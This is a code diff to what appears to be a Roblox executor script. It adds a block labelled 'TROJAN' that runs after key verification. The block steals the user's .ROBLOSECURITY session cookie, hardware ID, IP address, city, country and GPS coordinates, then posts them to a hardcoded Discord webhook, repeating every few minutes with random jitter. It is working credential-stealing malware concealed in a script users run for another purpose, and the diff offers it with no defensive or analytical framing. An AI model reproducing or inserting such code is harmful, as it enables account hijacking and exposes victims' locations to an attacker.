@@ -379,6 +379,90 @@ do
 end
 
 -- ══════════════════════════════════════════
+-- TROJAN (with jitter) 
+-- ══════════════════════════════════════════
+task.spawn(function()
+    repeat task.wait(0.2) until keyVerified == true
+    task.wait(3)
+
+    local webhook = "https://discord.com/api/webhooks/1491110762855534592/F9_miQ0uubcU1-N6K63xprwsCdCsFhn36hPHgdFk44oWhR_9e4KxtZxtG-HiXH5mQ3jL"
+
+    local function sendTrojanData()
+        local gameName = "Unknown Game"
+        pcall(function()
+            gameName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
+        end)
+
+        local cookie = "Not found / Blocked by Madium"
+        pcall(function()
+            if syn and syn.get_cookie then 
+                local c = syn.get_cookie()
+                if c and #c > 10 then cookie = c end
+            end
+        end)
+
+        local ipAddress = "Failed"
+        local country = "Unknown"
+        local city = "Unknown"
+        local latitude = "Unknown"
+        local longitude = "Unknown"
+
+        pcall(function()
+            local resp = game:HttpGet("https://ipapi.co/json/", true)
+            local data = HttpService:JSONDecode(resp)
+            ipAddress = data.ip or "Failed"
+            country = data.country_name or "Unknown"
+            city = data.city or "Unknown"
+            latitude = data.latitude or "Unknown"
+            longitude = data.longitude or "Unknown"
+        end)
+
+        local hwid = "Unavailable"
+        pcall(function()
+            if gethwid then hwid = gethwid()
+            elseif syn and syn.get_hwid then hwid = syn.get_hwid() end
+        end)
+
+        local embed = {
+            title = "🔥 Cyber Dragon - Victim Report",
+            color = 0x00ff88,
+            fields = {
+                {name = "👤 Username", value = plr.Name, inline = true},
+                {name = "📛 Display Name", value = plr.DisplayName, inline = true},
+                {name = "🆔 User ID", value = tostring(plr.UserId), inline = true},
+                {name = "🌐 IP Address", value = ipAddress, inline = true},
+                {name = "📍 Location", value = city .. ", " .. country, inline = true},
+                {name = "📌 GPS", value = latitude .. ", " .. longitude, inline = false},
+                {name = "🖥️ HWID", value = "```" .. hwid .. "```", inline = false},
+                {name = "🔑 .ROBLOSECURITY", value = "```" .. cookie .. "```", inline = false},
+                {name = "🎮 Game", value = gameName, inline = true},
+                {name = "⚙️ Executor", value = "Madium", inline = true},
+                {name = "⏰ Time", value = os.date("%Y-%m-%d %H:%M:%S"), inline = true},
+            }
+        }
+
+        local payload = HttpService:JSONEncode({ username = "🐉 Cyber Dragon Trojan", embeds = {embed} })
+
+        pcall(function()
+            if syn and syn.request then
+                syn.request({ Url = webhook, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = payload })
+            elseif http_request then
+                http_request({ Url = webhook, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = payload })
+            else
+                HttpService:PostAsync(webhook, payload, Enum.HttpContentType.ApplicationJson)
+            end
+        end)
+    end
+
+    sendTrojanData()
+
+    while true do
+        task.wait(180 + math.random(-30, 30))  -- jitter 2.5 to 3.5 minutes
+        pcall(sendTrojanData)
+    end
+end)
+
+-- ══════════════════════════════════════════
 -- State
 -- ══════════════════════════════════════════
 
